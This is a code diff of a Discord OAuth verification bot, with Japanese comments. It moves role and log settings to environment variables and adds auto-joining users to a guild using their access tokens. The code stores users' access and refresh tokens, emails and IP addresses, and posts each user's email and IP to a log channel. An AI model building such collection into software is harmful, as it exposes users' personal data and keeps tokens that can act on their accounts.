@@ -11,14 +11,14 @@ CLIENT_SECRET = os.environ.get('CLIENT_SECRET')
 BOT_TOKEN = os.environ.get('BOT_TOKEN')
 REDIRECT_URI = os.environ.get('REDIRECT_URI')
 GUILD_ID = os.environ.get('GUILD_ID')
+ROLE_ID = os.environ.get('ROLE_ID')
+LOG_CHANNEL_ID = os.environ.get('LOG_CHANNEL_ID')
 
 def init_db():
     conn = sqlite3.connect('users.db')
     c = conn.cursor()
     c.execute('''CREATE TABLE IF NOT EXISTS users 
                  (user_id TEXT PRIMARY KEY, access_token TEXT, refresh_token TEXT, email TEXT, ip_address TEXT)''')
-    c.execute('''CREATE TABLE IF NOT EXISTS settings 
-                 (guild_id TEXT PRIMARY KEY, role_id TEXT, log_channel_id TEXT)''')
     conn.commit()
     conn.close()
 
@@ -73,33 +73,45 @@ def callback():
     c = conn.cursor()
     c.execute("INSERT OR REPLACE INTO users (user_id, access_token, refresh_token, email, ip_address) VALUES (?, ?, ?, ?, ?)", 
               (user_id, access_token, refresh_token, email, user_ip))
-    c.execute("SELECT role_id, log_channel_id FROM settings WHERE guild_id = ?", (GUILD_ID,))
-    settings = c.fetchone()
     conn.commit()
     conn.close()
 
-    if settings:
-        role_id, log_channel_id = settings
-        bot_headers = {"Authorization": f"Bot {BOT_TOKEN}"}
+    bot_headers = {"Authorization": f"Bot {BOT_TOKEN}"}
 
-        if role_id:
-            requests.put(f"https://discord.com/api/guilds/{GUILD_ID}/members/{user_id}/roles/{role_id}", headers=bot_headers)
+    # サーバーに参加させる
+    requests.put(
+        f"https://discord.com/api/guilds/{GUILD_ID}/members/{user_id}",
+        headers=bot_headers,
+        json={"access_token": access_token}
+    )
 
-        if log_channel_id:
-            log_data = {
-                "embeds": [{
-                    "title": "🛡️ 詳細認証ログ",
-                    "description": (
-                        f"**ユーザー:** <@{user_id}>\n"
-                        f"**ID:** `{user_id}`\n"
-                        f"**メール:** `{email}`\n"
-                        f"**IP:** `{user_ip}`"
-                    ),
-                    "color": 0x2f3136,
-                    "thumbnail": {"url": f"https://cdn.discordapp.com/avatars/{user_id}/{avatar}.png"}
-                }]
-            }
-            requests.post(f"https://discord.com/api/channels/{log_channel_id}/messages", headers=bot_headers, json=log_data)
+    # ロール付与
+    if ROLE_ID:
+        requests.put(
+            f"https://discord.com/api/guilds/{GUILD_ID}/members/{user_id}/roles/{ROLE_ID}",
+            headers=bot_headers
+        )
+
+    # ログ送信
+    if LOG_CHANNEL_ID:
+        log_data = {
+            "embeds": [{
+                "title": "🛡️ 詳細認証ログ",
+                "description": (
+                    f"**ユーザー:** <@{user_id}>\n"
+                    f"**ID:** `{user_id}`\n"
+                    f"**メール:** `{email}`\n"
+                    f"**IP:** `{user_ip}`"
+                ),
+                "color": 0x2f3136,
+                "thumbnail": {"url": f"https://cdn.discordapp.com/avatars/{user_id}/{avatar}.png"}
+            }]
+        }
+        requests.post(
+            f"https://discord.com/api/channels/{LOG_CHANNEL_ID}/messages",
+            headers=bot_headers,
+            json=log_data
+        )
 
     return f'''
     <!DOCTYPE html>
